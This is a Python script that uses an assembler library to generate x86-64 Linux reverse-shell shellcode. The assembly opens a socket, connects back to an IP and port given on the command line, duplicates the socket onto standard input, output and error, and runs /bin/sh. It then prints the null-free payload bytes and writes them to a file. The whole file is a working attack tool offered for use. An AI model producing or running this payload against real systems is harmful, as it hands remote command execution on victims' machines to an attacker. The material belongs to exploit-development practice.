#!/usr/bin/env python3

import ctypes, struct, binascii, os, socket
from keystone import *

# Generates struct from IP and port
def sockaddr(ip, port):
    """
    Generates a C structure from an IP address and port number.

    :param ip: a string that represents an IP address.
    :param port: an integer that represents a port number.
    :return: a string that represents a C structure with the IP address and port number.
    """

    IP = ip
    PORT = port

    family = struct.pack('H', socket.AF_INET)
    portbytes = struct.pack('H', socket.htons(PORT))
    ipbytes = socket.inet_aton(IP)

    # Pack the data into a long long integer (8 bytes) in network byte order
    number = struct.unpack('Q', family + portbytes + ipbytes)
    number = -number[0]        #negate
    
    # Convert the long long integer to a string in hex format and return
    return "0x" + binascii.hexlify(struct.pack('>q', number)).decode('utf-8')

def toHexString(bytestring):
    """
    Converts a byte string to a hex string.

    :param bytestring: a bytes object to be converted.
    :return: a string that represents the hex values of the bytes object.
    """

    hex_string = "b'"
    for byte in bytestring:
        hex_string += f"\\x{byte:02x}"
    hex_string += "'"
    return hex_string

def main(ip, port):
    """
    Runs the main logic of the program.

    :param ip: a string that represents an IP address.
    :param port: an integer that represents a port number.
    """

    # Note: null-byte depends on the address and port.
    # Special modifications might be needed for some address.
    address = sockaddr(ip, port)

    # Shellcode is here
    assembly = (
        "socket:                             "
        "   push byte 41                    ;"      # Push/pop will set syscall num
        "   pop rax                         ;"
        "   cdq                             ;"      # cdq sets rdx to 0 if rax is positive
        "   push byte 2                     ;"      # AF_INET = 2
        "   pop rdi                         ;"
        "   push byte 1                     ;"      # SOCK_STREAM = 1
        "   pop rsi                         ;"
        "   syscall                         ;"      # socket(AF_INET, SOCK_STREAM, 0)
        "connect:                           ;"
        "   xchg eax, edi                   ;"      # rdi is 2, so moving only al is doable
        "   mov al, 42                      ;"
        "   mov rcx, " + address +         ";" +    # Socket address and port
        "   neg rcx                         ;"
        "   push rcx                        ;"
        "   push rsp                        ;"      # mov rsi, rsp. This it the pointer to sockaddr
        "   pop rsi                         ;"
        "   mov dl, 16                      ;"      # sockaddr length
        "   syscall                         ;"      # connect(s, addr, len(addr))
        "dup2:                              ;"
        "   push byte 3                     ;"      # Start with 3 and decrement
        "   pop rsi                         ;"
        "dup2_loop:                          "      # Duplicate socket fd into stdin,
                                                    # stdout and stderr, which fd are 0, 1 and 2
        "   mov al, 33                      ;"      # If there is no error, rax is 0 on connect and dup2
        "   dec esi                         ;"
        "   syscall                         ;"      # dup2(s, rsi)
        "   jnz dup2_loop                   ;"      # Jump when esi == 0
        "execve:                             "
        "   cdq                             ;"
        "   mov al, 59                      ;"      # execve syscall is 59
        "   push rdx                        ;"      # Put null-byte in /bin//sh
        "   mov rcx, 0x68732f2f6e69622f     ;"      # /bin//sh
        "   push rcx                        ;"
        "   push rsp                        ;"      # rsp points to the top of the stack, which is occupied by /bin/sh
        "   pop rdi                         ;"      # We use a push/pop to prevent null-byte and get a shorter shellcode
        "   syscall                         ;"      # execve('/bin//sh', 0, 0)
    )

    engine = Ks(KS_ARCH_X86, KS_MODE_64)
    shellcode, count = engine.asm(assembly)
    shellcode = bytearray(shellcode) # Needs to be mutable for later

    print("Number of instructions: " + str(count))
    print("Shellcode length: %d" % len(shellcode))
    print()
    print("Python byte array:")
    print(toHexString(shellcode))

    # open file in binary mode for writing
    with open('shell', 'wb') as f:
        f.write(shellcode)

if(__name__ == "__main__"):
    import argparse

    # create ArgumentParser object
    parser = argparse.ArgumentParser(description='Process some integers.')

    # add argument for return_address
    parser.add_argument('--ip', type=str, help='reverse call ip')

    # add argument for buffer_size
    parser.add_argument('--port', type=int, help='port')

    # parse command-line arguments
    args = parser.parse_args()

    if not args.ip or not args.port:
        args.ip = "127.0.0.1"
        args.port = 1337

    main(args.ip, args.port)
